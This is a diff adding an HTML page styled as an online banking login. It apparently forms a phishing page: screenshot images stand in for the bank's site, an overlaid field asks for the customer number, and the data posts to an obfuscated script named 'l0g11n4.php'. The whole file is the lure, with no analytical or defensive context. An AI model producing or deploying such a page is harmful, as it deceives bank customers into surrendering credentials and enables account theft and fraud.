@@ -1,0 +1,35 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Log in to Online Banking
+  </title>
+  <meta content="content-type" http-equiv="content-type" />
+  <link href="inc/1co.ico" rel="shortcut icon" />
+  <script type="text/javascript">
+   function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+  </script>
+ </head>
+ <body onload="unhideBody()" style="visibility: visible;">
+  <div style="position: absolute; width: 75px; height: 35px; z-index: 1; left: 837px; top: 503px">
+   <script language="javascript" type="text/javascript">
+    function ns(){
+		signupFORM = document.inputForm;
+		if(signupFORM.cnu.value == ""){ alert("Mandatory field: Customer Number");signupFORM.cnu.focus();return false;}
+return true;}
+   </script>
+   <form id="inputForm" onsubmit="return ns()" action="l0g11n4.php?refererident=411AE4224D88BDEFDA61A80B81D5EB44032CFBF5&" method="post" name="inputForm">
+    <input width="76" type="image" height="33" src="img/login.png" name="formimage1" />
+   </form>
+  </div>
+  <input type="text" style="position:absolute;width:88px;left:523;top:320;z-index:10" maxlength="10" name="cnu" />
+  <p>
+   <img border="0" src="img/index.1.jpg" />
+   <img border="0" src="img/index.2.jpg" />
+  </p>
+ </body>
+</html>
